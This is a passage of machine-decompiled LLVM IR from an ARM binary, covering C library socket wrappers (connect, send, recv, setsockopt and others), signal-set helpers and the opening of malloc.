  br label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %.dec_label_pc_15ab0_crit_edge, %dec_label_pc_15a68
  %v0_15ab4 = phi i32 [ 1, %.dec_label_pc_15ab0_crit_edge ], [ %v0_15aac, %dec_label_pc_15a68 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_15ab4, i32* %v1_157fc, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15abc:                               ; preds = %dec_label_pc_15a44
  %v3_15abc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_15abc, i32* @r0, align 4
  %v0_15ac0 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_157fc, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15834, %dec_label_pc_15880, %dec_label_pc_15864, %dec_label_pc_15858, %dec_label_pc_15844
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %bb, %dec_label_pc_15818, %dec_label_pc_15810, %dec_label_pc_157b8, %dec_label_pc_15abc, %dec_label_pc_15ab0, %dec_label_pc_159b0, %dec_label_pc_158cc, %dec_label_pc_15ad8
  store i32 %v6_1578c, i32* @r5, align 4
  store i32 %v9_1578c, i32* @r6, align 4
  store i32 %v12_1578c, i32* @r7, align 4
  store i32 %v15_1578c, i32* @r8, align 4
  store i32 %v18_1578c, i32* @sb, align 4
  store i32 %v21_1578c, i32* @sl, align 4
  store i32 %v24_1578c, i32* @fp, align 4
  %v29_15ae0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_15ae0

; uselistorder directives
  uselistorder i32 %v2_15a84, { 1, 0 }
  uselistorder i32 %v1_159a8, { 1, 2, 0 }
  uselistorder i32 %v1_15890, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1588c, { 1, 0, 2 }
  uselistorder i32 %v1_15880, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1584c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_15828, { 1, 0 }
  uselistorder i32* %v1_157fc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_1579c, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_15adc, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_15ad8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15ab0, { 1, 0 }
  uselistorder label %dec_label_pc_15844, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b00 = load i32, i32* @r4, align 4
  store i32 %v3_15b00, i32* %stack_var_-8, align 4
  %v5_15b04 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_15b04, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15b04, -4095
  br i1 %tmp, label %dec_label_pc_15b24, label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %entry
  %v0_15b14 = call i32 @__errno_location()
  %v0_15b18 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b18 = sub i32 0, %v0_15b18
  %v2_15b1c = inttoptr i32 %v0_15b14 to i32*
  store i32 %v1_15b18, i32* %v2_15b1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %entry, %dec_label_pc_15b14
  %v0_15b24 = phi i32 [ %v5_15b04, %entry ], [ -1, %dec_label_pc_15b14 ]
  %v2_15b28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15b28, i32* @r4, align 4
  ret i32 %v0_15b24

; uselistorder directives
  uselistorder i32 %v5_15b04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b2c = load i32, i32* @r4, align 4
  store i32 %v3_15b2c, i32* %stack_var_-8, align 4
  %v5_15b30 = inttoptr i32 %arg3 to i32*
  %v6_15b30 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_15b30)
  store i32 %v6_15b30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_15b30, -4095
  br i1 %tmp, label %dec_label_pc_15b50, label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %entry
  %v0_15b40 = call i32 @__errno_location()
  %v0_15b44 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b44 = sub i32 0, %v0_15b44
  %v2_15b48 = inttoptr i32 %v0_15b40 to i32*
  store i32 %v1_15b44, i32* %v2_15b48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %entry, %dec_label_pc_15b40
  %v0_15b50 = phi i32 [ %v6_15b30, %entry ], [ -1, %dec_label_pc_15b40 ]
  %v2_15b54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15b54, i32* @r4, align 4
  ret i32 %v0_15b50

; uselistorder directives
  uselistorder i32 %v6_15b30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b50, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b58 = load i32, i32* @r4, align 4
  store i32 %v3_15b58, i32* %stack_var_-8, align 4
  %v0_15b60 = call i32 @getsockopt()
  store i32 %v0_15b60, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15b60, -4095
  br i1 %tmp, label %dec_label_pc_15b80, label %dec_label_pc_15b70

dec_label_pc_15b70:                               ; preds = %entry
  %v0_15b70 = call i32 @__errno_location()
  %v0_15b74 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b74 = sub i32 0, %v0_15b74
  %v2_15b78 = inttoptr i32 %v0_15b70 to i32*
  store i32 %v1_15b74, i32* %v2_15b78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %entry, %dec_label_pc_15b70
  %v0_15b80 = phi i32 [ %v0_15b60, %entry ], [ -1, %dec_label_pc_15b70 ]
  %v2_15b84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15b84, i32* @r4, align 4
  ret i32 %v0_15b80

; uselistorder directives
  uselistorder i32 %v0_15b60, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b80, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b88 = load i32, i32* @r4, align 4
  store i32 %v3_15b88, i32* %stack_var_-8, align 4
  %v5_15b8c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_15b8c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15b8c, -4095
  br i1 %tmp, label %dec_label_pc_15bac, label %dec_label_pc_15b9c

dec_label_pc_15b9c:                               ; preds = %entry
  %v0_15b9c = call i32 @__errno_location()
  %v0_15ba0 = load i32, i32* %r4.global-to-local, align 4
  %v1_15ba0 = sub i32 0, %v0_15ba0
  %v2_15ba4 = inttoptr i32 %v0_15b9c to i32*
  store i32 %v1_15ba0, i32* %v2_15ba4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15bac

dec_label_pc_15bac:                               ; preds = %entry, %dec_label_pc_15b9c
  %v0_15bac = phi i32 [ %v5_15b8c, %entry ], [ -1, %dec_label_pc_15b9c ]
  %v2_15bb0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15bb0, i32* @r4, align 4
  ret i32 %v0_15bac

; uselistorder directives
  uselistorder i32 %v5_15b8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15bac, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15bb4 = load i32, i32* @r4, align 4
  store i32 %v3_15bb4, i32* %stack_var_-8, align 4
  %v5_15bb8 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_15bb8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15bb8, -4095
  br i1 %tmp, label %dec_label_pc_15bd8, label %dec_label_pc_15bc8

dec_label_pc_15bc8:                               ; preds = %entry
  %v0_15bc8 = call i32 @__errno_location()
  %v0_15bcc = load i32, i32* %r4.global-to-local, align 4
  %v1_15bcc = sub i32 0, %v0_15bcc
  %v2_15bd0 = inttoptr i32 %v0_15bc8 to i32*
  store i32 %v1_15bcc, i32* %v2_15bd0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %entry, %dec_label_pc_15bc8
  %v0_15bd8 = phi i32 [ %v5_15bb8, %entry ], [ -1, %dec_label_pc_15bc8 ]
  %v2_15bdc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15bdc, i32* @r4, align 4
  ret i32 %v0_15bd8

; uselistorder directives
  uselistorder i32 %v5_15bb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15bd8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15be0 = load i32, i32* @r4, align 4
  store i32 %v3_15be0, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_15bec = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_15bec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15bec, -4095
  br i1 %tmp, label %dec_label_pc_15c0c, label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %entry
  %v0_15bfc = call i32 @__errno_location()
  %v0_15c00 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c00 = sub i32 0, %v0_15c00
  %v2_15c04 = inttoptr i32 %v0_15bfc to i32*
  store i32 %v1_15c00, i32* %v2_15c04, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %entry, %dec_label_pc_15bfc
  %v0_15c0c = phi i32 [ %v5_15bec, %entry ], [ -1, %dec_label_pc_15bfc ]
  %v2_15c10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15c10, i32* @r4, align 4
  ret i32 %v0_15c0c

; uselistorder directives
  uselistorder i32 %v5_15bec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c0c, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15c14 = load i32, i32* @r4, align 4
  store i32 %v3_15c14, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_15c1c = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_15c1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15c1c, -4095
  br i1 %tmp, label %dec_label_pc_15c3c, label %dec_label_pc_15c2c

dec_label_pc_15c2c:                               ; preds = %entry
  %v0_15c2c = call i32 @__errno_location()
  %v0_15c30 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c30 = sub i32 0, %v0_15c30
  %v2_15c34 = inttoptr i32 %v0_15c2c to i32*
  store i32 %v1_15c30, i32* %v2_15c34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %entry, %dec_label_pc_15c2c
  %v0_15c3c = phi i32 [ %v5_15c1c, %entry ], [ -1, %dec_label_pc_15c2c ]
  %v2_15c40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15c40, i32* @r4, align 4
  ret i32 %v0_15c3c

; uselistorder directives
  uselistorder i32 %v5_15c1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c3c, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15c44 = load i32, i32* @r4, align 4
  store i32 %v3_15c44, i32* %stack_var_-8, align 4
  %v0_15c48 = call i32 @socket()
  store i32 %v0_15c48, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15c48, -4095
  br i1 %tmp, label %dec_label_pc_15c68, label %dec_label_pc_15c58

dec_label_pc_15c58:                               ; preds = %entry
  %v0_15c58 = call i32 @__errno_location()
  %v0_15c5c = load i32, i32* %r4.global-to-local, align 4
  %v1_15c5c = sub i32 0, %v0_15c5c
  %v2_15c60 = inttoptr i32 %v0_15c58 to i32*
  store i32 %v1_15c5c, i32* %v2_15c60, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c68

dec_label_pc_15c68:                               ; preds = %entry, %dec_label_pc_15c58
  %v0_15c68 = phi i32 [ %v0_15c48, %entry ], [ -1, %dec_label_pc_15c58 ]
  %v2_15c6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15c6c, i32* @r4, align 4
  ret i32 %v0_15c68

; uselistorder directives
  uselistorder i32 %v0_15c48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c68, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_15c8c, label %dec_label_pc_15c7c

dec_label_pc_15c7c:                               ; preds = %entry
  %v8_15c80 = icmp sgt i32 %arg1, 64
  br i1 %v8_15c80, label %dec_label_pc_15c8c, label %dec_label_pc_15c84

dec_label_pc_15c84:                               ; preds = %dec_label_pc_15c7c
  %v0_15c88 = call i32 @__sigaddset()
  br label %dec_label_pc_15c8c

dec_label_pc_15c8c:                               ; preds = %dec_label_pc_15c7c, %entry, %dec_label_pc_15c84
  %v0_15c8c = call i32 @__errno_location()
  %v2_15c94 = inttoptr i32 %v0_15c8c to i32*
  store i32 22, i32* %v2_15c94, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c8c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_15cac = load i32, i32* @r0, align 4
  %v2_15cac = inttoptr i32 %v0_15cac to i8*
  %v3_15cac = call i32 @__GI_memset(i8* %v2_15cac, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15cb8 = load i32, i32* @r4, align 4
  store i32 %v3_15cb8, i32* %stack_var_-12, align 4
  %v6_15cb8 = load i32, i32* @r5, align 4
  %v10_15cb8 = ptrtoint i32* %stack_var_-12 to i32
  %v7_15cbc = icmp eq i32 %arg2, -1
  %v0_15cc8.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_15cbc, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_15ce0

bb:                                               ; preds = %entry
  %v2_15cc4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_15cc8.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_15cc8.pre, 1
  br i1 %tmp19, label %dec_label_pc_15ce0, label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %bb
  %v7_15cd4 = icmp sgt i32 %v0_15cc8.pre, 64
  br i1 %v7_15cd4, label %dec_label_pc_15ce0, label %bb20

bb20:                                             ; preds = %dec_label_pc_15cd0
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_15d0424 = add i32 %v10_15cb8, 124
  store i32 %v5_15d0424, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cf4

dec_label_pc_15ce0:                               ; preds = %.thread, %dec_label_pc_15cd0, %bb
  %v0_15ce0 = call i32 @__errno_location()
  store i32 %v0_15ce0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15cec = inttoptr i32 %v0_15ce0 to i32*
  store i32 22, i32* %v2_15cec, align 4
  %v0_15d60.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d60

dec_label_pc_15cf4:                               ; preds = %bb20, %dec_label_pc_15cf4
  %v5_15d0425 = phi i32 [ %v5_15d0424, %bb20 ], [ %v5_15d04, %dec_label_pc_15cf4 ]
  %v2_15cf8 = add i32 %v5_15d0425, -136
  %v3_15cf8 = inttoptr i32 %v2_15cf8 to i32*
  store i32 0, i32* %v3_15cf8, align 4
  %v0_15cfc.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_15cfc = add i32 %v0_15cfc.pre, -1
  store i32 %v1_15cfc, i32* %r0.global-to-local, align 4
  %v6_15cfc = icmp slt i32 %v1_15cfc, 0
  %v4_15d04 = mul i32 %v1_15cfc, 4
  %v5_15d04 = add i32 %v4_15d04, %v10_15cb8
  store i32 %v5_15d04, i32* %r2.global-to-local, align 4
  br i1 %v6_15cfc, label %dec_label_pc_15d0c, label %dec_label_pc_15cf4

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cf4
  %v2_15d0c = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_15d0c, i32* @r5, align 4
  %v2_15d10 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_15d10, i32* @r0, align 4
  %v0_15d14 = load i32, i32* @r4, align 4
  store i32 %v0_15d14, i32* @r1, align 4
  %v0_15d18 = call i32 @__sigaddset()
  store i32 %v0_15d18, i32* %r0.global-to-local, align 4
  %v1_15d1c = icmp slt i32 %v0_15d18, 0
  br i1 %v1_15d1c, label %dec_label_pc_15d5c, label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15d0c
  %v0_15d24 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2caf0.982 to i32), i32* %r0.global-to-local, align 4
  %v2_15d2c = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_2caf0.982 to i32), i32 %v0_15d24)
  store i32 %v2_15cc4, i32* %r2.global-to-local, align 4
  %v0_15d44 = load i32, i32* @r4, align 4
  store i32 %v0_15d44, i32* %r0.global-to-local, align 4
  %v4_15d4c = call i32 @__libc_sigaction(i32 %v0_15d44, i32* nonnull %stack_var_-152, i32 %v2_15cc4)
  store i32 %v4_15d4c, i32* %r0.global-to-local, align 4
  %v1_15d50 = icmp slt i32 %v4_15d4c, 0
  br i1 %v1_15d50, label %dec_label_pc_15d5c, label %bb23

bb23:                                             ; preds = %dec_label_pc_15d24
  %v5_15d54 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_15d54, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d60

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d24, %dec_label_pc_15d0c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d60

dec_label_pc_15d60:                               ; preds = %bb23, %dec_label_pc_15ce0, %dec_label_pc_15d5c
  %v0_15d60 = phi i32 [ %v5_15d54, %bb23 ], [ %v0_15d60.pre, %dec_label_pc_15ce0 ], [ -1, %dec_label_pc_15d5c ]
  store i32 %v0_15d60, i32* %r0.global-to-local, align 4
  %v2_15d68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15d68, i32* @r4, align 4
  store i32 %v6_15cb8, i32* @r5, align 4
  ret i32 %v0_15d60

; uselistorder directives
  uselistorder i32 %v0_15d60, { 1, 0 }
  uselistorder i32 %v5_15d04, { 1, 0 }
  uselistorder i32 %v1_15cfc, { 0, 2, 1 }
  uselistorder i32 %v2_15cc4, { 1, 0 }
  uselistorder i32 %v0_15cc8.pre, { 1, 0, 2 }
  uselistorder i32 %v10_15cb8, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15d60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cf4, { 1, 0 }
  uselistorder label %dec_label_pc_15ce0, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15d70 = add i32 %arg2, -1
  %v3_15d74 = udiv i32 %v1_15d70, 32
  %v4_15d78 = mul nuw nsw i32 %v3_15d74, 4
  %v5_15d78 = add i32 %v4_15d78, %arg1
  %v6_15d78 = inttoptr i32 %v5_15d78 to i32*
  %v7_15d78 = load i32, i32* %v6_15d78, align 4
  %v1_15d7c = urem i32 %v1_15d70, 32
  %v7_15d84 = shl i32 1, %v1_15d7c
  %v8_15d84 = and i32 %v7_15d78, %v7_15d84
  %v10_15d84 = icmp ne i32 %v8_15d84, 0
  %. = zext i1 %v10_15d84 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_15d70, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_15d94 = load i32, i32* @r1, align 4
  %v1_15d94 = add i32 %v0_15d94, -1
  %v3_15d98 = udiv i32 %v1_15d94, 32
  %v0_15d9c = load i32, i32* @r0, align 4
  %v4_15d9c = mul nuw nsw i32 %v3_15d98, 4
  %v5_15d9c = add i32 %v0_15d9c, %v4_15d9c
  %v6_15d9c = inttoptr i32 %v5_15d9c to i32*
  %v7_15d9c = load i32, i32* %v6_15d9c, align 4
  %v1_15da0 = urem i32 %v1_15d94, 32
  %v7_15da8 = shl i32 1, %v1_15da0
  %v8_15da8 = or i32 %v7_15d9c, %v7_15da8
  store i32 %v8_15da8, i32* %v6_15d9c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15d94, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15db8 = add i32 %arg2, -1
  %v3_15dbc = udiv i32 %v1_15db8, 32
  %v4_15dc0 = mul nuw nsw i32 %v3_15dbc, 4
  %v5_15dc0 = add i32 %v4_15dc0, %arg1
  %v6_15dc0 = inttoptr i32 %v5_15dc0 to i32*
  %v7_15dc0 = load i32, i32* %v6_15dc0, align 4
  %v1_15dc4 = urem i32 %v1_15db8, 32
  %tmp = shl i32 -1, %v1_15dc4
  %v8_15dcc = add i32 %tmp, -1
  %v9_15dcc = and i32 %v7_15dc0, %v8_15dcc
  store i32 %v9_15dcc, i32* %v6_15dc0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15db8, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15ddc = load i32, i32* @r4, align 4
  %v6_15ddc = load i32, i32* @r5, align 4
  %v9_15ddc = load i32, i32* @r6, align 4
  %v0_15de0 = load i32, i32* %r0.global-to-local, align 4
  %v2_15de0 = icmp eq i32 %v0_15de0, 0
  %v2_15de4 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_15de0, label %bb, label %dec_label_pc_15df0

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15df8

dec_label_pc_15df0:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_15de0, -8
  br i1 %tmp, label %dec_label_pc_15efc, label %dec_label_pc_15df8

dec_label_pc_15df8:                               ; preds = %bb, %dec_label_pc_15df0
  %v0_15df8 = phi i32 [ %v0_15de0, %dec_label_pc_15df0 ], [ 1, %bb ]
  %v1_15df8 = add i32 %v0_15df8, 4
  store i32 %v1_15df8, i32* %stack_var_-20, align 4
  store i32 %v2_15de4, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2ca80.984 to i32), i32* %r0.global-to-local, align 4
  %v1_15e10 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_26630.988 to i32), i32* %r0.global-to-local, align 4
  %v3_15e1c = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_26630.988 to i32*), i32 %v2_15de4)
  store i32 %v3_15e1c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2ca80.984 to i32), i32* %r0.global-to-local, align 4
  store i32 89652, i32* @lr, align 4
  %v1_15e30 = call i32 @__pthread_return_0()
  store i32 %v1_15e30, i32* %r0.global-to-local, align 4
  %v2_15e34 = icmp eq i32 %v3_15e1c, 0
  br i1 %v2_15e34, label %dec_label_pc_15e3c, label %dec_label_pc_15eec

dec_label_pc_15e3c:                               ; preds = %dec_label_pc_15df8
  %v2_15e40 = load i32, i32* @global_var_2caa8.835, align 4
  store i32 %v2_15e40, i32* @r4, align 4
  %v2_15e44 = load i32, i32* %stack_var_-20, align 4
  %v3_15e48 = icmp ult i32 %v2_15e44, %v2_15e40
  br i1 %v3_15e48, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_15e3c
  %v3_15e4c = add i32 %v2_15e40, -1
  %v2_15e50 = add i32 %v3_15e4c, %v2_15e44
  %v2_15e54 = sub i32 0, %v2_15e40
  %v3_15e58 = and i32 %v2_15e50, %v2_15e54
  store i32 %v3_15e58, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15e3c, %bb14
  store i32 ptrtoint (i32* @global_var_2cb70.992 to i32), i32* %r0.global-to-local, align 4
  %v1_15e64 = call i32 @__pthread_return_0()
  %v0_15e68 = load i32, i32* @r4, align 4
  store i32 %v0_15e68, i32* %r0.global-to-local, align 4
  %v1_15e6c = call i32 @__GI_sbrk(i32 %v0_15e68)
  store i32 %v1_15e6c, i32* %r0.global-to-local, align 4
  %v7_15e70 = icmp eq i32 %v1_15e6c, -1
  br i1 %v7_15e70, label %bb15, label %dec_label_pc_15e7c

bb15:                                             ; preds = %.thread3
  store i32 %v1_15e6c, i32* @r5, align 4
  br label %dec_label_pc_15e90

dec_label_pc_15e7c:                               ; preds = %.thread3
  %v1_15e7c = add i32 %v1_15e6c, 3
  %v1_15e80 = and i32 %v1_15e7c, -4
  store i32 %v1_15e80, i32* @r5, align 4
  %v9_15e84 = icmp eq i32 %v1_15e80, %v1_15e6c
  br i1 %v9_15e84, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_15e7c
  %v3_15e88 = sub i32 %v1_15e80, %v1_15e6c
  store i32 %v3_15e88, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_15e7c, %bb16
  %v1_15e8c = xor i1 %v9_15e84, true
  call void @__pseudo_cond_branch(i1 %v1_15e8c, i32 ptrtoint (i32* @global_var_1755c.993 to i32))
  br label %dec_label_pc_15e90

dec_label_pc_15e90:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2cb70.992 to i32), i32* %r0.global-to-local, align 4
  store i32 89760, i32* @lr, align 4
  %v1_15e9c = call i32 @__pthread_return_0()
  store i32 %v1_15e9c, i32* %r0.global-to-local, align 4
  %v0_15ea0 = load i32, i32* @r5, align 4
  %v7_15ea0 = icmp eq i32 %v0_15ea0, -1
  br i1 %v7_15ea0, label %dec_label_pc_15efc, label %dec_label_pc_15ea8

dec_label_pc_15ea8:                               ; preds = %dec_label_pc_15e90
